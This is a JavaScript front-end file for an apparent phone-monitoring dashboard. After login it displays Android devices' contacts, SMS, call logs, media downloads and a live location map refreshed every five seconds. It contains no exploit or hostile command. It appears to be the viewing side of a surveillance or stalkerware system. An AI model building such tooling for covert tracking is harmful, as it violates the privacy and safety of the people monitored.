// public/main.js (substituir)
const API_ROOT = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function getToken() { return localStorage.getItem(tokenKey); }
function setToken(t) { if (t) localStorage.setItem(tokenKey, t); else localStorage.removeItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }
function setUser(u) { if (u) localStorage.setItem(userKey, JSON.stringify(u)); else localStorage.removeItem(userKey); }

async function apiPost(path, body) {
  const token = getToken();
  const headers = { 'Content-Type': 'application/json' };
  if (token) headers.Authorization = 'Bearer ' + token;
  const res = await fetch(API_ROOT + path, { method: 'POST', headers, body: JSON.stringify(body) });
  return res.json().catch(()=>({}));
}
async function apiGet(path) {
  const token = getToken();
  const headers = {};
  if (token) headers.Authorization = 'Bearer ' + token;
  const res = await fetch(API_ROOT + path, { headers });
  if (!res.ok) return [];
  return res.json().catch(()=>[]);
}

/* AUTH UI */
document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value.trim();
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await apiPost('/auth/login', { username: u, password: p });
  if (r && r.token) {
    setToken(r.token);
    setUser(r.user || { username: u });
    document.getElementById('loginMsg').innerText = '';
    showLoggedInUI();
    await loadDevices();
    refreshAll();
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Login failed';
  }
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value.trim();
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await apiPost('/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = (r && r.ok) ? 'Registered. Please login.' : (r.error || 'Register failed');
});
document.getElementById('btnLogout').addEventListener('click', () => { setToken(null); setUser(null); location.reload(); });

function showLoggedInUI() {
  const lb = document.getElementById('loginBox');
  const ub = document.getElementById('userBox');
  if (lb) lb.classList.add('hidden');
  if (ub) ub.classList.remove('hidden');
  const user = getUser();
  if (user) document.getElementById('userName').innerText = user.username || '';
}

/* menu */
document.querySelectorAll('.menu-btn').forEach(b => b.addEventListener('click', () => {
  const t = b.getAttribute('data-target');
  showPanel(t);
}));
function hideAllPanels() { document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden')); }
function showPanel(name) {
  hideAllPanels();
  const mapId = {
    contacts: 'contactsPanel',
    sms: 'smsPanel',
    calls: 'callsPanel',
    notifs: 'notifsPanel',
    location: 'locationPanel',
    usage: 'usagePanel',
    media: 'mediaPanel',
    devices: 'devicesPanel'
  }[name];
  if (mapId) document.getElementById(mapId).classList.remove('hidden');
}

/* DEVICES */
async function loadDevices() {
  const devices = await apiGet('/devices');
  const div = document.getElementById('devicesList');
  div.innerHTML = '';
  if (!Array.isArray(devices) || devices.length === 0) { div.innerHTML = 'Nenhum dispositivo'; return; }
  devices.forEach(d => {
    const row = document.createElement('div');
    row.style.display = 'flex'; row.style.justifyContent = 'space-between'; row.style.padding = '6px 0'; row.style.borderBottom = '1px solid #eee';
    const left = document.createElement('div');
    left.innerHTML = `<strong>${escapeHtml(d.label || d.androidId)}</strong><div style="color:#666">${d.lastSeen?new Date(d.lastSeen).toLocaleString():'never'}</div>`;
    const right = document.createElement('div');
    const dot = document.createElement('span'); dot.textContent = '●';
    dot.style.color = (d.lastSeen && (Date.now() - new Date(d.lastSeen).getTime()) < 120000) ? 'green' : 'red';
    dot.style.marginRight = '8px';
    right.appendChild(dot);
    const btn = document.createElement('button'); btn.textContent='Ver mapa';
    btn.onclick = () => {
      const input = document.getElementById('mapDeviceId');
      if (input) input.value = d._id || d.androidId || '';
      showPanel('location');
      renderMap();
    };
    right.appendChild(btn);
    row.appendChild(left); row.appendChild(right);
    div.appendChild(row);
  });
}

/* CONTACTS */
document.getElementById('btnSearchContacts').addEventListener('click', renderContacts);
async function renderContacts() {
  const q = document.getElementById('contactsQuery').value || '';
  const deviceId = document.getElementById('mapDeviceId').value || '';
  const qp = deviceId ? `?deviceRecordId=${encodeURIComponent(deviceId)}&q=${encodeURIComponent(q)}` : `?q=${encodeURIComponent(q)}`;
  const data = await apiGet('/contacts' + qp);
  const ul = document.getElementById('contactsList'); ul.innerHTML = '';
  if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhum contacto</li>'; return; }
  data.forEach(c => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(c.name||'(sem nome)')}</strong><div style="color:#666">${escapeHtml(c.number||'')}</div></div>`;
    ul.appendChild(li);
  });
}

/* SMS / CALLS / MEDIA */
async function renderSms() {
  const deviceId = document.getElementById('mapDeviceId').value || '';
  const q = deviceId ? `?deviceRecordId=${encodeURIComponent(deviceId)}` : '';
  const data = await apiGet('/sms' + q);
  const ul = document.getElementById('smsList'); ul.innerHTML = '';
  if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhum SMS</li>'; return; }
  data.forEach(s => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(s.sender||'')}</strong>: ${escapeHtml(s.message||'')}</div><div style="color:#666">${new Date(s.timestamp||Date.now()).toLocaleString()}</div>`;
    ul.appendChild(li);
  });
}
async function renderCalls() {
  const deviceId = document.getElementById('mapDeviceId').value || '';
  const q = deviceId ? `?deviceRecordId=${encodeURIComponent(deviceId)}` : '';
  const data = await apiGet('/call' + q);
  const ul = document.getElementById('callsList'); ul.innerHTML = '';
  if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhuma chamada</li>'; return; }
  data.forEach(c => {
    const li = document.createElement('li');
    const num = c.number || '(unknown)';
    const dur = c.duration ? Math.round(c.duration/1000)+'s' : '-';
    li.innerHTML = `<div><strong>${escapeHtml(num)}</strong><div style="color:#666">${escapeHtml(c.state||'')} • ${dur}</div></div><div style="color:#666">${new Date(c.timestamp||Date.now()).toLocaleString()}</div>`;
    ul.appendChild(li);
  });
}
async function renderMedia() {
  const deviceId = document.getElementById('mapDeviceId').value || '';
  const q = deviceId ? `?deviceRecordId=${encodeURIComponent(deviceId)}` : '';
  const data = await apiGet('/media' + q);
  const ul = document.getElementById('mediaList'); ul.innerHTML = '';
  if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhuma media</li>'; return; }
  data.forEach(m => {
    const li = document.createElement('li');
    const dl = document.createElement('button'); dl.textContent = 'Download';
    dl.onclick = async () => {
      const token = getToken();
      const resp = await fetch(API_ROOT + '/media/' + m._id, { headers: { Authorization: 'Bearer ' + token } });
      if (!resp.ok) return alert('Download failed');
      const blob = await resp.blob();
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = m.filename || m._id; document.body.appendChild(a); a.click(); a.remove();
    };
    li.innerHTML = `<div><strong>${escapeHtml(m.filename||m._id)}</strong><div style="color:#666">${m.metadata ? escapeHtml(JSON.stringify(m.metadata)) : ''}</div></div>`;
    li.appendChild(dl);
    ul.appendChild(li);
  });
}

/* MAP */
let map, markersLayer;
function initMap() {
  if (map) return;
  map = L.map('map').setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
  markersLayer = L.layerGroup().addTo(map);
}
document.getElementById('btnReloadMap').addEventListener('click', renderMap);

async function renderMap() {
  initMap();
  markersLayer.clearLayers();
  const deviceId = document.getElementById('mapDeviceId').value || '';
  const limit = 200;
  const q = deviceId ? `?deviceRecordId=${encodeURIComponent(deviceId)}&limit=${limit}` : `?limit=${limit}`;
  const data = await apiGet('/location' + q);
  if (!Array.isArray(data) || data.length === 0) return;
  let mostRecent = null;
  for (let i = 0; i < data.length; i++) {
    const p = data[i];
    if (p.lat == null || p.lon == null) continue;
    const lat = Number(p.lat), lon = Number(p.lon);
    const ts = p.timestamp || Date.now();
    const acc = p.accuracy !== undefined ? p.accuracy : '';
    const popup = `<div style="font-size:13px">
      <div><strong>Lat:</strong> ${lat.toFixed(6)}</div>
      <div><strong>Lon:</strong> ${lon.toFixed(6)}</div>
      <div><strong>Accuracy:</strong> ${escapeHtml(String(acc))}</div>
      <div><strong>Data/Hora:</strong> ${new Date(ts).toLocaleString()}</div>
    </div>`;
    const marker = L.marker([lat, lon]).bindPopup(popup);
    markersLayer.addLayer(marker);
    if (!mostRecent) mostRecent = { lat, lon, marker };
  }
  if (mostRecent) {
    map.setView([mostRecent.lat, mostRecent.lon], 13);
    mostRecent.marker.openPopup();
  }
}

/* REFRESH */
async function refreshAll() {
  await loadDevices();
  await Promise.allSettled([renderMap(), renderContacts(), renderSms(), renderCalls(), renderMedia()]);
}
setInterval(() => { if (getToken()) refreshAll(); }, 5000);

/* BOOT */
window.addEventListener('load', async () => {
  if (getToken()) {
    showLoggedInUI();
    await loadDevices();
    refreshAll();
  } else {
    // show login by default
    showPanel('devices');
  }
});

/* HELPERS */
function escapeHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s).replace(/[&<>"']/g, (m) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' })[m]);
}
function getToken() { return localStorage.getItem(tokenKey); }
